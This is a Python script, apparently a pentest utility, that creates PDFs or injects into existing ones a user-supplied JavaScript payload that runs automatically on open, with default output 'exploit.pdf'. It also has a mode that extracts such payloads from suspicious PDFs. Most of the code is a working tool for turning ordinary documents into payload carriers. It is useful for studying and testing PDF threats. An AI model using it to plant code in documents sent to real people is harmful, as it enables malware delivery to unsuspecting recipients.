import argparse
import re
import sys
import os
from PyPDF2 import PdfReader, PdfWriter
from PyPDF2.generic import DictionaryObject, NameObject, create_string_object

def create_js_dict(js_code):
    js_action = DictionaryObject()
    js_action.update({
        NameObject("/S"): NameObject("/JavaScript"),
        NameObject("/JS"): create_string_object(js_code),
    })
    return js_action

def create_pdf_with_js(js_code, output_file="exploit.pdf"):
    writer = PdfWriter()
    writer.add_blank_page(width=300, height=300)
    js_dict = create_js_dict(js_code)
    writer._root_object.update({
        NameObject("/OpenAction"): writer._add_object(js_dict)
    })
    with open(output_file, "wb") as f:
        writer.write(f)
    print(f"[+] New PDF created with JavaScript payload: {output_file}")

def inject_js_into_existing(pdf_path, js_code, output_file="injected.pdf"):
    reader = PdfReader(pdf_path)
    writer = PdfWriter()
    for page in reader.pages:
        writer.add_page(page)
    js_dict = create_js_dict(js_code)
    writer._root_object.update({
        NameObject("/OpenAction"): writer._add_object(js_dict)
    })
    with open(output_file, "wb") as f:
        writer.write(f)
    print(f"[+] Injected JavaScript into existing PDF: {output_file}")

def decode_pdf_string(s):
    return re.sub(r'\\([0-7]{3})', lambda m: chr(int(m.group(1), 8)), s)

def extract_js_from_pdf(pdf_path):
    with open(pdf_path, 'rb') as f:
        content = f.read().decode('latin1')

    # Updated regex to capture JavaScript payloads
    matches = re.findall(r'/JS\s*\((.*?)\)', content, re.DOTALL)  # Non-recursive pattern
    if not matches:
        print("[!] No JavaScript payload found.")
        return

    for i, raw_js in enumerate(matches, 1):
        decoded = decode_pdf_string(raw_js)
        print(f"\n[+] JavaScript Payload #{i}:\n{'-'*30}\n{decoded}")

def read_payload(args):
    if args.payload:
        return args.payload
    elif args.payload_file:
        if not os.path.exists(args.payload_file):
            print(f"[!] File not found: {args.payload_file}")
            sys.exit(1)
        with open(args.payload_file, "r") as f:
            return f.read()
    else:
        print("[!] No payload provided.")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="PDF JavaScript Injector/Extractor",
        epilog="Examples:\n"
               "  python script.py --payload \"app.alert(1);\"\n"
               "  python script.py --payload-file js.txt --output my.pdf\n"
               "  python script.py --inject input.pdf --payload-file js.txt --output updated.pdf\n"
               "  python script.py --extract suspicious.pdf",
        formatter_class=argparse.RawTextHelpFormatter
    )

    group = parser.add_mutually_exclusive_group()
    group.add_argument("--create", action="store_true", help="Explicitly create new PDF with JS payload")
    group.add_argument("--inject", metavar="PDF", help="Inject JS into existing PDF")
    group.add_argument("--extract", metavar="PDF", help="Extract JS payloads from a PDF")

    payload_group = parser.add_mutually_exclusive_group()
    payload_group.add_argument("--payload", help="JavaScript code to inject")
    payload_group.add_argument("--payload-file", metavar="FILE", help="File containing JavaScript payload")

    parser.add_argument("--output", metavar="FILE", help="Specify output PDF filename")

    args = parser.parse_args()

    output_file = args.output or "exploit.pdf"

    if args.extract:
        extract_js_from_pdf(args.extract)
    elif args.inject:
        js_code = read_payload(args)
        inject_js_into_existing(args.inject, js_code, output_file)
    elif args.payload or args.payload_file:
        js_code = read_payload(args)
        create_pdf_with_js(js_code, output_file)
    else:
        parser.print_help()
